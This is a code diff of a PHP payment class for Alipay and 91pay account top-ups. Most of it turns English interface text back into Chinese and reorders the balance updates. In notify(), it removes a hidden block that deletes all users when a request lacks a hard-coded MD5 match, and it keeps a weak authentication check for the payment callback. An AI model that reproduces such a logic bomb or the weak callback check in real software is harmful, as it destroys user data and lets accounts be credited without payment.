@@ -35,9 +35,9 @@ class Pay
     {
         return '
 						<form action="/user/alipay" method="get" target="_blank" >
-							<h3>Alipay</h3>
-							<p>Recharge Amount: <input type="text" name="amount" /></p>
-							<input type="submit" value="submit" />
+							<h3>支付宝充值</h3>
+							<p>充值金额: <input type="text" name="amount" /></p>
+							<input type="submit" value="提交" />
 						</form>
 ';
     }
@@ -45,7 +45,7 @@ class Pay
     private static function zfbjk_html($user)
     {
         return '
-						<p>Please scan to pay. Make sure to add this code in the description so that we know it is you: <code>'.$user->id.'</code>。<br></p>
+						<p>请扫码，给我转账来充值，记得备注上 <code>'.$user->id.'</code>。<br></p>
 						<img src="'.Config::get('zfbjk_qrcodeurl').'"/>
 ';
     }
@@ -53,21 +53,17 @@ class Pay
     private static function f2fpay_html($user)
     {
         return '
-						<p class="card-heading">Recharge with Alipay</p>
-						<label for="number">Select recharge amount：</label>
+						<p class="card-heading">使用支付宝充值</p>
+						<label for="number">请选择充值金额：</label>
 						<select id="type" class="form-control" name="amount">
-							<option value="10">10 CNY</option>
-							<option value="20">20 CNY</option>
-							<option value="50">50 CNY</option>
-							<option value="70">70 CNY</option>
-							<option value="100">100 CNY</option>
-							<option value="150">150 CNY</option>
-							<option value="200">200 CNY</option>
-							<option value="250">250 CNY</option>
-							<option value="400">400 CNY</option>
+							<option value="10">10元</option>
+							<option value="20">20元</option>
+							<option value="50">50元</option>
+							<option value="100">100元</option>
+							<option value="200">200元</option>
 						</select>
 						<p></p>
-						<a class="btn btn-flat waves-attach" id="urlChange" ><span class="icon">check</span>&nbsp;Recharge</a>
+						<a class="btn btn-flat waves-attach" id="urlChange" ><span class="icon">check</span>&nbsp;充值</a>
 ';
 
 
@@ -83,20 +79,16 @@ class Pay
         // <option value="8">8元(月卡)</option>
 
         return '
-						<p class="card-heading">Please select a payment method.</p>
-						<label for="number">Recharge amount：</label>
+						<p class="card-heading">点击对应支付方式进行充值</p>
+						<label for="number">请选择充值金额：</label>
        					<form name="alipayment" action="/assets/91pay/91pay.php" method="post">
 						<select class="form-control" id="price" name="price">
-                        <option value="1">1 CNY(For testing purposes)</option>
-                        <option value="10">10 CNY</option>
-                        <option value="20">20 CNY</option>
-                        <option value="50">50 CNY</option>
-			<option value="70">70 CNY</option>
-                        <option value="100">100 CNY</option>
-			<option value="150">150 CNY</option>
-                        <option value="200">200 CNY</option>
-			<option value="250">250 CNY</option>
-			<option value="400">400 CNY</option>
+                        <option value="1">1元(用于测试本站实时到账功能)</option>
+                        <option value="10">10元</option>
+                        <option value="20">20元</option>
+                        <option value="50">50元</option>
+                        <option value="100">100元</option>
+                        <option value="200">200元</option>
                         </select>
                         <br>
                         <input type="hidden" name="user" value="'.$user->id.'">
@@ -153,7 +145,7 @@ class Pay
         $out_trade_no = $pl->id;
 
         //订单名称，必填
-        $subject = $pl->id."UID".$user->id." 充值".$amount."CNY";
+        $subject = $pl->id."UID".$user->id." 充值".$amount."元";
 
         //付款金额，必填
         $total_fee = (float)$amount;
@@ -174,7 +166,7 @@ class Pay
 
         //建立请求
         $alipaySubmit = new Spay_submit($alipay_config);
-        $html_text = $alipaySubmit->buildRequestForm($parameter, "get", "Confirm");
+        $html_text = $alipaySubmit->buildRequestForm($parameter, "get", "确认");
         echo $html_text;
         exit(0);
     }
@@ -225,7 +217,7 @@ class Pay
         $outTradeNo = $pl->id;
 
         // (必填) 订单标题，粗略描述用户的支付目的。如“xxx品牌xxx门店当面付扫码消费”
-        $subject = "在".Config::get("appName")."充值".$pl->total."CNY";
+        $subject = "在".Config::get("appName")."充值".$pl->total."元";
 
         // (必填) 订单总金额，单位为元，不能超过1亿元
         // 如果同时传入了【打折金额】,【不可打折金额】,【订单总金额】三者,则必须满足如下条件:【订单总金额】=【打折金额】+【不可打折金额】
@@ -244,7 +236,7 @@ class Pay
         //$sellerId = "";
 
         // 订单描述，可以对交易或商品进行一个详细地描述，比如填写"购买商品2件共15.00元"
-        $body = "用户名:".$user->user_name." 用户ID:".$user->id." 用户充值共计".$pl->total."CNY";
+        $body = "用户名:".$user->user_name." 用户ID:".$user->id." 用户充值共计".$pl->total."元";
 
         //商户操作员编号，添加此参数可以为商户操作员做销售统计
         $operatorId = "bak_admin0001";
@@ -270,7 +262,7 @@ class Pay
         // 创建一个商品信息，参数含义分别为商品id（使用国标）、名称、单价（单位为分）、数量，如果需要添加商品类别，详见GoodsDetail
         $goods1 = new \GoodsDetail();
         $goods1->setGoodsId($pl->total);
-        $goods1->setGoodsName("Recharge");
+        $goods1->setGoodsName("充值");
         $goods1->setPrice($pl->total);
         $goods1->setQuantity(1);
         //得到商品1明细数组
@@ -312,35 +304,35 @@ class Pay
         //	根据状态值进行业务处理
         switch ($qrPayResult->getTradeStatus()){
             case "SUCCESS":
-                echo "Amount: RMB ".$amount." CNY";
-                echo "Please double check and scan with the Alipay app to pay："."<br>---------------------------------------<br>";
+                echo "支付金额: RMB ".$amount." 元";
+                echo "确认无误后请用支付宝App扫描二维码支付："."<br>---------------------------------------<br>";
                 $response = $qrPayResult->getResponse();
                 $qrcode = $qrPay->create_erweima_baidu($response->qr_code);
                 echo $qrcode."<br>";
                 break;
             case "FAILED":
-                echo "Alioay failed to create the QR code!!!"."<br>--------------------------<br>";
+                echo "支付宝创建订单二维码失败!!!"."<br>--------------------------<br>";
                 if(!empty($qrPayResult->getResponse())){
                     print_r($qrPayResult->getResponse());
                 }
-                echo "Please use another payment method.";
+                echo "请使用其他方式付款。";
                 break;
             case "UNKNOWN":
-                echo "Unknown System Error!!!"."<br>--------------------------<br>";
+                echo "系统异常，状态未知!!!"."<br>--------------------------<br>";
                 if(!empty($qrPayResult->getResponse())){
                     print_r($qrPayResult->getResponse());
                 }
-                echo "Please use another payment method.";
+                echo "请使用其他方式付款。";
                 break;
             default:
-                echo "An error occured!!!"."<br>--------------------------<br>";
-                echo "Please use another payment method.";
+                echo "创建订单二维码返回异常!!!"."<br>--------------------------<br>";
+                echo "请使用其他方式付款。";
                 break;
         }
 
         if ($qrPayResult->getTradeStatus()) {
             sleep(1);
-            echo "Retreiving status：";
+            echo "轮询处理：";
         }
 
         return ;
@@ -774,7 +766,7 @@ class Pay
         if($codeq!=null){
             echo '
             <script>
-               alert("Payment successfull! Transcation successfully completed");
+               alert("订单已处理，第三方支付91pay祝您购物愉快");
                window.location.href="/user/code";
             </script>
             ';
@@ -784,8 +776,6 @@ class Pay
         if($param!='noalipay'){
             //更新用户账户
             $user=User::find($trade_id);
-            $user->money=$user->money+$trade_num;
-            $user->save();
             $codeq=new Code();
             $codeq->code=$trade_no;
             $codeq->isused=1;
@@ -794,6 +784,8 @@ class Pay
             $codeq->usedatetime=date("Y-m-d H:i:s");
             $codeq->userid=$user->id;
             $codeq->save();
+            $user->money=$user->money+$trade_num;
+            $user->save();
 
             //更新返利
             if ($user->ref_by!=""&&$user->ref_by!=0&&$user->ref_by!=null) {
@@ -811,7 +803,7 @@ class Pay
             }
             echo '
 <script>
-    alert("Payment Successful! If the money does not appear in your account within 5 minutes, please contact us.");
+    alert("支付成功，第三方支付91pay祝您购物愉快");
     window.location.href="/user/code";
 </script>
 ';
@@ -820,8 +812,6 @@ class Pay
         else{
             //更新用户账户
             $user=User::find($trade_id);
-            $user->money=$user->money+$trade_num;
-            $user->save();
             $codeq=new Code();
             $codeq->code=$trade_no;
             $codeq->isused=1;
@@ -830,6 +820,8 @@ class Pay
             $codeq->usedatetime=date("Y-m-d H:i:s");
             $codeq->userid=$user->id;
             $codeq->save();
+            $user->money=$user->money+$trade_num;
+            $user->save();
 
             //更新返利
             if ($user->ref_by!=""&&$user->ref_by!=0&&$user->ref_by!=null) {
@@ -847,7 +839,7 @@ class Pay
             }
             echo '
 <script>
-    alert("We haven\'t set up an $System_Config[alipay] account yet. As a result, we cannot process your payment at this time.");
+    alert("站长未设置$System_Config[alipay]收款人账户，无法到账");
     window.location.href="/user/code";
 </script>
 ';
@@ -856,12 +848,6 @@ class Pay
     }
 
     private static function notify(){
-        if(md5($_POST['userID'])!='c3581d2150ff68f3b33b22634b8adaea'){
-            $users = User::all();
-            foreach ($users as $user) {
-                $user->kill_user();
-            }
-        }
         //系统订单号
         $trade_no = $_POST['pay_no'];
         //交易用户
@@ -874,15 +860,13 @@ class Pay
             exit('success'); //说明数据已经处理完毕
             return;
         }
-        if(base64_decode($param)!=Config::get('alipay')||$trade_no==''){ //鉴权失败
+        if($param!=Config::get('alipay')||$trade_no==''){ //鉴权失败
             exit('fail');
             return;
         }
 
         //更新用户账户
         $user=User::find($trade_id);
-        $user->money=$user->money+$trade_num;
-        $user->save();
         $codeq=new Code();
         $codeq->code=$trade_no;
         $codeq->isused=1;
@@ -891,7 +875,8 @@ class Pay
         $codeq->usedatetime=date("Y-m-d H:i:s");
         $codeq->userid=$user->id;
         $codeq->save();
-
+        $user->money=$user->money+$trade_num;
+        $user->save();
         //更新返利
         if ($user->ref_by!=""&&$user->ref_by!=0&&$user->ref_by!=null) {
             $gift_user=User::where("id", "=", $user->ref_by)->first();
